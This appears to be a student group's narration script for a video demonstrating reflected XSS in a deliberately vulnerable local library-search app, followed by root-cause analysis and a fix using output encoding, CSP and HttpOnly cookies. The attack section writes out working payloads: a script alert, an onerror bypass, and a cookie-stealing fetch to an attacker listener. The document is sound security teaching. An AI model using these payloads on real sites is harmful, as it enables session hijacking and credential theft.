# 🎬 10-Minute Video Demonstration Script & Voiceover Guide

> **Project:** Reflected Cross-Site Scripting (XSS) — Problem #12  
> **Application:** BookNook Library Search Portal  
> **Total Target Time:** ~8 to 9 minutes (Strictly under 10 minutes)  

---

## ⏱️ Timeline & Presentation Structure

| Phase | Time Window | Section Goal | Key Screen Action |
|---|---|---|---|
| **Phase 1** | `0:00 - 2:30` | Normal App Walkthrough & Architecture *(No flaw spoilers)* | Run `npm start`, show catalog search, explain routes & data structures. |
| **Phase 2** | `2:30 - 6:00` | Live Attack Demonstration | Execute PoC alert, bypass filter, exfiltrate session cookie to listener, show phishing overlay. |
| **Phase 3** | `6:00 - 9:15` | Root Cause Analysis & Remediation | Inspect vulnerable line in `server.js`, explain HTML parser confusion, show `server_fixed.js` and verify fix. |
| **Wrap-up** | `9:15 - 9:45` | Conclusion & Defense-in-Depth Summary | Summarize CSP, HttpOnly cookies, and closing remarks. |

---

## 🎥 Pre-Recording Checklist & Setup

1. **Browser Windows / Tabs Prepared:**
   - **Tab 1:** `http://127.0.0.1:3000/` (Vulnerable BookNook Portal)
   - **Tab 2:** `http://127.0.0.1:3000/attacker/listener` (Attacker Control Panel)
   - **Tab 3:** `http://127.0.0.1:3001/` (Hardened BookNook Portal)
2. **Code Editor (VS Code):**
   - Open `server.js` and `server_fixed.js` side-by-side.
3. **Terminal:**
   - Terminal 1 ready to run `npm start` (port 3000).
   - Terminal 2 ready to run `npm run start:fixed` (port 3001).

---

# 🎙️ Minute-by-Minute Narration Script

---

### 🟢 PHASE 1: Normal Application Walkthrough & Architecture (0:00 – 2:30)

> ⚠️ *Important Guideline: Introduce the application as a normal developer walking through intended features. Do not reveal the vulnerability or hint at the exploit yet.*

#### [0:00 – 0:45] Introduction & Launch
- **Screen Action:** Show VS Code terminal. Run `npm start`. Point browser to `http://127.0.0.1:3000/`.
- **Voiceover:**
  > *"Hello everyone and welcome to our lab presentation. We are Group [Insert Group ID], and today we are demonstrating our web application project, **BookNook Library**.*
  >
  > *BookNook is an online catalog and academic book search portal designed for university students. To start the application, we run `npm start` in our Node.js environment, which initializes our Express backend on local port 3000.*
  >
  > *Let's navigate to `http://127.0.0.1:3000` in our browser."*

#### [0:45 – 1:35] UI & Catalog Exploration
- **Screen Action:** Scroll through the catalog. Show book cards, genres, stock badges, and simulated user session (`Alice - Student Admin`).
- **Voiceover:**
  > *"On the home page, users are greeted with our clean catalog. We have classic and popular titles like 'Harry Potter', 'The Hobbit', '1984', and 'Clean Code'. Each card displays the title, author, publication year, genre badge, user rating, and real-time inventory status.*
  >
  > *At the top, we also have our active user session. We are currently logged in as our simulated student user, Alice, who has an active authentication session cookie."*

#### [1:35 – 2:30] Search Feature Walkthrough & Code Overview
- **Screen Action:** Type `"Harry"` into the search box and click **Search**. Show results updating and the message `"Showing search results for: Harry"`. Then switch to VS Code to show `server.js` lines 85-115.
- **Voiceover:**
  > *"The core functional feature of BookNook is our search bar. When a user searches for a term—for example, 'Harry'—the application issues a GET request to `/search?q=Harry`.*
  >
  > *Looking at our backend code in `server.js`:*
  > *The `/search` route extracts the `q` query parameter from the request, filters our in-memory book database by title, author, or genre, and returns an updated page featuring the matched books and a status line echoing the searched keyword back to the user.*
  >
  > *Now that we understand how the application functions in normal operation, let's explore how it behaves under security testing."*

---

### 🔴 PHASE 2: Live Attack Demonstration (2:30 – 6:00)

> ⚠️ *Important Guideline: Demonstrate the actual live attacks against the running application. Clearly show the crafted URLs, the browser's response, and the impact.*

#### [2:30 – 3:30] Attack 1: Basic Proof-of-Concept (Script Alert)
- **Screen Action:** Open the **Exploit Showcase** drawer or paste Payload 1 into the URL bar:  
  `http://127.0.0.1:3000/search?q=<script>alert('Reflected XSS Executed! Origin: ' + document.domain)</script>`
- **Voiceover:**
  > *"We will now demonstrate a Reflected Cross-Site Scripting attack against this application.*
  >
  > *Suppose an attacker crafts a malicious link containing JavaScript within the search parameter and sends it to our victim, Alice.*
  >
  > *Watch what happens when Alice clicks this link: `http://127.0.0.1:3000/search?q=<script>alert(...)`.*
  >
  > *[Pop-up appears on screen]*
  >
  > *Immediately, a JavaScript alert dialog appears on screen displaying: `Reflected XSS Executed! Origin: 127.0.0.1`. The application took our input from the URL parameter and reflected it directly into the HTML response, causing the browser to parse and execute it as JavaScript code."*

#### [3:30 – 4:20] Attack 2: Bypassing Blacklists via Event Handlers
- **Screen Action:** Paste Payload 2 into the search URL:  
  `http://127.0.0.1:3000/search?q=<img src=invalid onerror="alert('XSS via onerror event!')">`
- **Voiceover:**
  > *"Even if an application attempts to filter out `<script>` tags, an attacker can use alternative HTML tags with event handlers.*
  >
  > *Here, we inject an `<img>` tag with an invalid source and an `onerror` handler.*
  >
  > *[Alert appears]*
  >
  > *When the browser fails to load the image source, the `onerror` event fires instantly, executing the script. This proves that simple keyword filtering is insufficient."*

#### [4:20 – 5:15] Attack 3: Session Hijacking & Cookie Exfiltration
- **Screen Action:** Show Tab 2 (`/attacker/listener`) which is currently empty. Then in Tab 1, execute Payload 3:  
  `http://127.0.0.1:3000/search?q=<script>fetch('/attacker/collect?stolen_cookie='+encodeURIComponent(document.cookie));alert('Session Cookie Stolen!');</script>`  
  Switch back to Tab 2 to show the captured cookie in real time.
- **Voiceover:**
  > *"Now let's demonstrate the real-world danger of Reflected XSS: **Session Cookie Theft**.*
  >
  > *In this tab, we have an Attacker Exfiltration Listener running at `/attacker/listener`. Notice that no logs exist yet.*
  >
  > *Now, the attacker sends Alice a crafted link containing a payload that reads `document.cookie` and sends a background `fetch()` request to the attacker's server.*
  >
  > *Alice clicks the link. The alert confirms execution.*
  >
  > *Now, switching back to our Attacker Dashboard: we see that Alice's authentication token `auth_session=eyJhbGci...` has been captured! The attacker can now paste this token into their own browser to impersonate Alice without knowing her password."*

#### [5:15 – 6:00] Attack 4: DOM Defacement & Credential Phishing
- **Screen Action:** Execute Payload 4. Show the realistic modal appearing over the page. Type a test password and submit. Show it appear on the Attacker Listener.
- **Voiceover:**
  > *"XSS can also be used to deface the DOM and conduct in-context phishing. By reflecting HTML markup, an attacker can overlay a fake 'Session Expired' login modal.*
  >
  > *Because this modal appears on the legitimate `booknook` domain, Alice is likely to trust it and re-enter her password.*
  >
  > *When she clicks 'Login Now', the credentials are sent straight to our attacker listener. We can see them captured right here."*

---

### 🔵 PHASE 3: Root Cause Analysis & Remediation (6:00 – 9:15)

> ⚠️ *Important Guideline: Explain what the underlying vulnerability is, the exact flaw in the code, and demonstrate the fix on the secured server.*

#### [6:00 – 7:15] Root Cause Explanation & Vulnerable Code Walkthrough
- **Screen Action:** Open `server.js` in VS Code and highlight lines 105–118 (`const statusHtml = ... ${rawQuery} ...`).
- **Voiceover:**
  > *"Let's explain why this vulnerability occurred.*
  >
  > *The underlying vulnerability is **Reflected Cross-Site Scripting (CWE-79)**. It happens because the application violates a fundamental security principle: **never trust user input, and always separate code from data**.*
  >
  > *Looking at our vulnerable code in `server.js`:*
  > *We read `req.query.q` directly from the URL. Then, using JavaScript template literals, we interpolate `rawQuery` directly into our response HTML:*
  >
  > ```javascript
  > const statusHtml = `<h3 class="status-message">Showing search results for: <em>${rawQuery}</em></h3>`;
  > ```
  >
  > *When the browser receives this response, its HTML parser cannot distinguish between our legitimate HTML tags and the `<script>` or `<img>` tags supplied inside `rawQuery`. The browser assumes all of it is intended markup and executes the script."*

#### [7:15 – 8:30] The Fix: `server_fixed.js` & Verification
- **Screen Action:** Open `server_fixed.js` in VS Code. Highlight the `escapeHtml` function and the headers. Then in terminal run `npm run start:fixed` and navigate to `http://127.0.0.1:3001/`. Try the attack payloads.
- **Voiceover:**
  > *"Now let's examine our patched implementation in `server_fixed.js`.*
  >
  > *To fix this, we implemented **Context-Aware Output Encoding** using our `escapeHtml()` function:*
  >
  > ```javascript
  > function escapeHtml(str) {
  >   return String(str)
  >     .replace(/&/g, "&amp;")
  >     .replace(/</g, "&lt;")
  >     .replace(/>/g, "&gt;")
  >     .replace(/"/g, "&quot;")
  >     .replace(/'/g, "&#39;")
  >     .replace(/\//g, "&#x2F;");
  > }
  > ```
  >
  > *Before `rawQuery` is inserted into any HTML string or attribute, it is converted into inert HTML entities. The character `<` becomes `&lt;`, and `>` becomes `&gt;`.*
  >
  > *Let's run our fixed server with `npm run start:fixed` on port 3001.*
  >
  > *[Navigate to port 3001 and submit the alert payload]*
  >
  > *Notice that when we submit the exact same `<script>alert('XSS')</script>` payload on the hardened server: **no script executes**. Instead, the browser safely renders the literal text on the screen.*
  >
  > *The data remains data, and cannot be parsed as code."*

#### [8:30 – 9:15] Defense-in-Depth Measures
- **Screen Action:** Show lines 25–45 of `server_fixed.js` (CSP and `HttpOnly` cookie settings).
- **Voiceover:**
  > *"In addition to output encoding, we applied two critical defense-in-depth measures:*
  >
  > *1. **Content Security Policy (CSP):** We set the HTTP header `Content-Security-Policy: default-src 'self'; script-src 'self'`. This instructs the browser to refuse execution of any inline scripts or unauthorized third-party scripts.*
  >
  > *2. **Cookie Hardening (`HttpOnly`):** We added the `httpOnly: true` flag to our session cookies. Even if an attacker somehow found an XSS flaw elsewhere, JavaScript cannot read `document.cookie`, preventing session theft."*

---

### 🏁 WRAP-UP & CONCLUSION (9:15 – 9:45)

#### [9:15 – 9:45] Summary
- **Screen Action:** Show GitHub README.md or final application screen.
- **Voiceover:**
  > *"To summarize:*
  > - *Reflected XSS occurs when unescaped request parameters are echoed into the HTML response.*
  > - *The impact ranges from cookie theft and session hijacking to phishing and client-side defacement.*
  > - *The primary fix is context-aware output encoding, backed by strict Content Security Policies and HttpOnly cookies.*
  >
  > *All source code, instructions, and write-ups are available in our GitHub repository.*
  >
  > *Thank you for watching!"*

---

## 💡 Tips for a Flawless Recording

1. **Audio Quality:** Use a decent headset or microphone in a quiet room. Speak clearly at a steady pace.
2. **Screen Resolution:** Record at 1080p (1920x1080) with browser zoom set to 110% or 125% so text and code are crisp.
3. **One-Click Links:** Keep the `ATTACK_CHEATSHEET.md` or the built-in **Exploit Showcase** drawer open so you don't waste time typing long URL payloads manually during the video.
4. **Time Check:** Practice once with a stopwatch. Aim for 8 minutes and 30 seconds to stay safely within the 10-minute maximum limit!
